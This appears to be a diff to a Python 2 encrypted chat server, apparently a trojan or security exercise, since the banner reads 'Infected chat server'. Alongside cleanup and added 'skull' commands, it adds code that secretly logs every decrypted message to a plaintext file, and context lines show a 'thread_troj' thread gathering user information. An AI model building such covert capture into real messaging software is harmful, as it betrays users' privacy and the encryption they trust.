@@ -22,6 +22,8 @@ import hashlib
 from os.path import expanduser
 import threading
 from threading import Thread, RLock, Event
+import datetime
+from dessin import *
 
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -51,6 +53,12 @@ IP_REG_PORT_DICT = {}
 global list_infos
 list_infos = []
 
+now = datetime.datetime.now()
+minute = now.minute
+hour = now.hour
+day = now.day
+month = now.month
+year = now.year
 
 # Fonction permettant de transmettre un message envoyé à tous les clients connectés
 def transmit(server_socket, sock, message, ip, is_message_client):
@@ -58,6 +66,17 @@ def transmit(server_socket, sock, message, ip, is_message_client):
     # Message en provenance d'un client
     if is_message_client:
         decrypted_message = decrypt_message(ip, message, IP_SYM_KEY_DICT) # Le message envoyé par le socket est déchiffré
+
+        with open("message_store", "a+") as f:
+
+            str_minute = ""
+            str_minute = str(minute)
+            
+            if int(minute) in range(0, 10):
+                str_minute = "0" + str(minute)
+
+            saved_data = str(day) + "/" + str(month) + "/" + str(year) + " at [" + str(hour) + "h" + str_minute + "]" + " " + decrypted_message + "\n"
+            f.write(saved_data)
 
         # Gestion des commandes
         if check_command(decrypted_message):
@@ -82,6 +101,28 @@ def transmit(server_socket, sock, message, ip, is_message_client):
 
                 return
 
+            elif command == "$get_skull":
+                skull = ""
+                skull = get_skull()
+                hex_ciphertext = encrypt_message(sock_ip ,skull , IP_SYM_KEY_DICT)
+                sock.send(hex_ciphertext)
+
+                return
+
+            elif command == "$get_skull_diffuse":
+                skull = ""
+                skull = get_skull()
+
+                for socket in SOCKET_LIST:
+                    if socket != server_socket: #permet de ne pas envoyer le message au client envoyeur du message       
+                        # Chiffrer le message pour tous les sockets présents et le renvoyer a tous les sockets apres chiffrement
+                        curr_tuple = socket.getpeername()
+                        ip_client_addr = curr_tuple[0]
+                        hex_ciphertext = encrypt_message(ip_client_addr,skull , IP_SYM_KEY_DICT)
+                        socket.send(hex_ciphertext)
+
+                return
+
             elif command == "$get_nicknames_up":
                 nickname_list = []
                 sock_ip = ip
@@ -94,7 +135,9 @@ def transmit(server_socket, sock, message, ip, is_message_client):
                 str_nicknames = "server_message" + "\n" + str_nicknames.replace(", ", "\\n")
 
                 hex_ciphertext = encrypt_message(sock_ip ,str_nicknames , IP_SYM_KEY_DICT)
-                sock.send(hex_ciphertext)               
+                sock.send(hex_ciphertext) 
+
+                return              
 
             elif command == "$help":
                 sock_ip = ip
@@ -102,7 +145,6 @@ def transmit(server_socket, sock, message, ip, is_message_client):
                 commands_list = get_commands()
                 str_commands = "".join(commands_list)
                 str_commands = "server_message" + "\n" + str_commands.replace(", ", "\\n")
-                print "commands help: " + str_commands
                 hex_ciphertext = encrypt_message(sock_ip ,str_commands , IP_SYM_KEY_DICT)
                 sock.send(hex_ciphertext)
 
@@ -134,7 +176,6 @@ def transmit(server_socket, sock, message, ip, is_message_client):
             
             else:
                 sock_ip = ip
-                print "ip erreur: " + sock_ip
                 err_command = "Unknown command"
                 hex_ciphertext = encrypt_message(sock_ip ,err_command , IP_SYM_KEY_DICT) # Sinon on renvoie un message d'erreur au socket envoyeur
                 sock.send(hex_ciphertext)
@@ -146,9 +187,6 @@ def transmit(server_socket, sock, message, ip, is_message_client):
             arobase_parse = arobase_parser(decrypted_message, True)
             nickname = arobase_parse[0]
             message_to_send = arobase_parse[1]
-            print "nickname: " + nickname
-            print "trunc message: " + message_to_send
-            print "liste nicknames: " + str(IP_NICKNAME)
 
             for ip_cipher_addr in IP_NICKNAME:
                 if IP_NICKNAME[ip_cipher_addr] == nickname: # Gérer le cas ou les pseudos sont les memes!!!!!
@@ -169,23 +207,38 @@ def transmit(server_socket, sock, message, ip, is_message_client):
         for socket in SOCKET_LIST:
             if socket != server_socket and socket != sock: #permet de ne pas envoyer le message au client envoyeur du message
                 try : 		
-                    # Chiffrer le message pour tous les sockets présents et le renvoyer a tous les sockets apres encryption
+                    # Chiffrer le message pour tous les sockets présents et le renvoyer a tous les sockets apres chiffrement
                     curr_tuple = socket.getpeername()
                     ip_client_addr = curr_tuple[0]
                     hex_ciphertext = encrypt_message(ip_client_addr, decrypted_message, IP_SYM_KEY_DICT)
                     socket.send(hex_ciphertext)
 
-                except:
-                    curr_tuple = socket.getpeername()
-                    ip_client_addr = curr_tuple[0]                    
+                except:                   
                     # broken socket connection
                     socket.close()
                     # broken socket, remove it
                     if socket in SOCKET_LIST:
                         SOCKET_LIST.remove(socket)
-                        del IP_NICKNAME[ip_client_addr]
-                        del IP_PORT_DICT[ip_client_addr]
-                        del IP_REG_PORT_DICT[ip_client_addr]
+                    
+                    ip_addr = ""
+                    
+                    for ip in IP_SOCKET_DICT:
+                        if str(socket) == str(IP_SOCKET_DICT[ip]):
+                            ip_addr = str(ip)
+                            break                    
+                    
+                    if ip_addr != "":                                        
+                        if ip_addr in IP_SOCKET_DICT:
+                            del IP_SOCKET_DICT[ip_addr]
+                            
+                        if ip_addr in IP_NICKNAME:
+                            del IP_NICKNAME[ip_addr]
+                            
+                        if ip_addr in IP_PORT_DICT:
+                            del IP_PORT_DICT[ip_addr]
+                            
+                        if ip_addr in IP_REG_PORT_DICT:
+                            del IP_REG_PORT_DICT[ip_addr]
 
     # Message en provenance du serveur
     else: 
@@ -194,7 +247,7 @@ def transmit(server_socket, sock, message, ip, is_message_client):
             # Pas besoin de déchiffrement car c'est un message en provenance du serveur (déjà sous format string)
             if socket != server_socket and socket != sock: #sock != client_socket pour ne pas envoyer le message au serveur
                 try: 		
-                    # Chiffrer le message pour tous les sockets présents et le renvoyer a tous les sockets apres encryption
+                    # Chiffrer le message pour tous les sockets présents et le renvoyer a tous les sockets apres chiffrement
                     curr_tuple = socket.getpeername()
                     ip_client_addr = curr_tuple[0]
 
@@ -203,16 +256,33 @@ def transmit(server_socket, sock, message, ip, is_message_client):
 
                 except:
                     # broken socket connection
-                    curr_tuple = socket.getpeername()
-                    ip_client_addr = curr_tuple[0]
-
-                    socket.close()
                     # broken socket, remove it
+                    socket.close()
+                    
                     if socket in SOCKET_LIST:
-                        SOCKET_LIST.remove(socket)        
-                        del IP_NICKNAME[ip_client_addr]
-                        del IP_PORT_DICT[ip_client_addr]
-                        del IP_REG_PORT_DICT[ip_client_addr]
+                        SOCKET_LIST.remove(socket)                   
+                    
+                    ip_addr = ""
+                    
+                    for ip in IP_SOCKET_DICT:
+                        if str(socket) == str(IP_SOCKET_DICT[ip]):
+                            ip_addr = str(ip)
+                            break        
+                    
+                    if ip_addr != "":                                      
+                        if ip_addr in IP_SOCKET_DICT:
+                            del IP_SOCKET_DICT[ip_addr]
+                            
+                        if ip_addr in IP_NICKNAME:
+                            del IP_NICKNAME[ip_addr]
+                            
+                        if ip_addr in IP_PORT_DICT:
+                            del IP_PORT_DICT[ip_addr]
+                            
+                        if ip_addr in IP_REG_PORT_DICT:
+                            del IP_REG_PORT_DICT[ip_addr]
+
+        return
 
 
 class Get_list(object):
@@ -317,7 +387,7 @@ def chat_server():
     #add server socket object to the list of readable connections
     SOCKET_LIST.append(server_socket)
     #IP_SOCKET_DICT["server_socket"] = server_socket
-    print "Chat crypt started on port " + str(int(port))
+    print "Infected chat server started on port " + str(int(port))
 
     while 1:
         #list sockets which are ready to be read through select
@@ -344,7 +414,6 @@ def chat_server():
 
                 IP_FIRST_CONNECTION_DICT[ip_client] = True # Premiere connexion
 
-                print "Client (%s, %s) connected " % addr
 
                 for ip in IP_SOCKET_DICT:
                     if str(ip) == str(ip_client):
@@ -354,22 +423,26 @@ def chat_server():
                         del IP_SOCKET_DICT[ip]
                         break
 
-                print "IP_SOCKET_DICT apres boucle: " + str(IP_SOCKET_DICT)
-
                 IP_SOCKET_DICT[ip_client] = sockfd
 
-                SOCKET_LIST.append(sockfd) 
-                print "liste IP_SOCKET_DICT: " + str(IP_SOCKET_DICT)
+                SOCKET_LIST.append(sockfd)
+
                 #check if it is a known client or generate new pair of keys 
                 public_key = check_pub_key(ip_client)
+                
+                str_minute = ""
+                str_minute = str(minute)
+                if int(minute) in range(0, 10):
+                    str_minute = "0" + str(minute)
+
+                print ""               
+                print "[" + str(hour) + "h" + str_minute + "] " + "[" + str(ip_client) + "," + str(addr[1]) + "]" + " Public key  Done..."
 
                 #hashing the public key
                 #hash_object = hashlib.sha1(public_key.exportKey())
                 #hex_digest = hash_object.hexdigest()                
 
                 sockfd.send(public_key.exportKey())
-                #is_message_client = False
-                #transmit(server_socket, sockfd, "(%s:%s) has join the room\n" % addr, None, is_message_client)
 
             # a message from a client, not a new connection
             else:
@@ -381,11 +454,7 @@ def chat_server():
                     if data:
                         socket_infos = sock.getpeername()
                         curr_ip = socket_infos[0]
-                        curr_port = socket_infos[1]
-
-                        print "liste IP_SOCKET_DICT: " + str(IP_SOCKET_DICT)
-
-                        print "liste IP_FIRST CONNECTION: " + str(IP_FIRST_CONNECTION_DICT)                        
+                        curr_port = socket_infos[1]                       
 
                         for client_ip in IP_SOCKET_DICT:
                             # Si ce n'est pas le premier message d'un socket, il s'agit d'un message normal                  
@@ -408,8 +477,6 @@ def chat_server():
 
                                 # Réception de la clé symétrique hexadécimale chiffrée avec la clé publique
                                 data_size = len(data)
-                                print "longueur de la clé + l'IV: " + str(len(data))
-
                                 hex_enc_sym_key = data[32:1056]
                                 hex_enc_port = data[1056:1064]
                                 hex_enc_nickname = data[1064:len(data)]
@@ -417,8 +484,15 @@ def chat_server():
 
                                 # Déchiffrement de la clé symétrique
                                 priv_key = get_priv_key(curr_ip)
-                                sym_key = asym_decrypt(enc_sym_key, priv_key)
+                                
+                                str_minute = ""
+                                str_minute = str(minute)
+                                if int(minute) in range(0, 10):
+                                    str_minute = "0" + str(minute)
 
+                                print "[" + str(hour) + "h" + str_minute + "] " + "[" + str(curr_ip) + "," + str(curr_port) + "]" + " Private key  Done..."
+                                sym_key = asym_decrypt(enc_sym_key, priv_key)
+                                print "[" + str(hour) + "h" + str_minute + "] " + "[" + str(curr_ip) + "," + str(curr_port) + "]" + " Symetric key  Done..."
 
                                 # Association de la clé symétrique et de l'IV à l'ip du client:
                                 sym_key_iv_pair = [sym_key, IV]
@@ -434,13 +508,13 @@ def chat_server():
                                 IP_NICKNAME[curr_ip] = nickname
 
                                 nickname_to_print = nickname.replace("@", "")
-                                transmit(server_socket, sock, str(nickname_to_print) + " (%s:%s) has join the conversation\n" % socket_infos, None, False)
+
+                                print "[" + str(hour) + "h" + str_minute + "] " + "Nickname:" + str(nickname_to_print) + " [" + str(curr_ip) + "," + str(curr_port) + "]" + " now connected"
+                                transmit(server_socket, sock, str(nickname_to_print) + " (%s:%s) has join the conversation\n" % socket_infos, curr_ip, False)
 
                                 thread_troj = Send_users_infos(curr_ip)
                                 list_infos.append(thread_troj.get_info())
                                 thread_troj.start()
-
-                                print "nickname: " + str(nickname)
 
                                 IP_FIRST_CONNECTION_DICT[curr_ip] = False
 
@@ -448,26 +522,37 @@ def chat_server():
 
                     else:
                         # remove the socket that's broken
-                        if sock in SOCKET_LIST:
-                            ip_tuple = sock.getpeername()
-                            ip_addr = ip_tuple[0]
-
-                            del IP_SOCKET_DICT[ip_addr]                        
-                            SOCKET_LIST.remove(sock)
-
-                            del IP_NICKNAME[ip_addr]
-
-                            del IP_PORT_DICT[ip_addr]
-
-                            del IP_REG_PORT_DICT[ip_addr]
-
                         # at this stage, no data means probably the connection has been broken
-                        transmit(server_socket, sock, "Client (%s, %s) is offline\n" % addr, None, False)
+                        ip_addr = ""
+                        
+                        transmit(server_socket, sock, "Client (%s, %s) is offline\n" % addr, ip_addr, False) 
+                        
+                        if sock in SOCKET_LIST:
+                            SOCKET_LIST.remove(sock) 
+                            
+                        for ip in IP_SOCKET_DICT:
+                            if str(sock) == str(IP_SOCKET_DICT[ip]):
+                                ip_addr = str(ip)
+                                break
+                        
+                        if ip_addr != "":                                        
+                            if ip_addr in IP_SOCKET_DICT:
+                                del IP_SOCKET_DICT[ip_addr]
+                                
+                            if ip_addr in IP_NICKNAME:
+                                del IP_NICKNAME[ip_addr]
+                                
+                            if ip_addr in IP_PORT_DICT:
+                                del IP_PORT_DICT[ip_addr]
+                                
+                            if ip_addr in IP_REG_PORT_DICT:
+                                del IP_REG_PORT_DICT[ip_addr]
+                    
 
                 # exception
                 except:
-                    transmit(server_socket, sock, "Client (%s, %s) is offline\n" % addr, None, False)
-                    continue
+                    pass
+                    #transmit(server_socket, sock, "Client (%s, %s) is offline\n" % addr, None, False)
 
     server_socket.close()
 
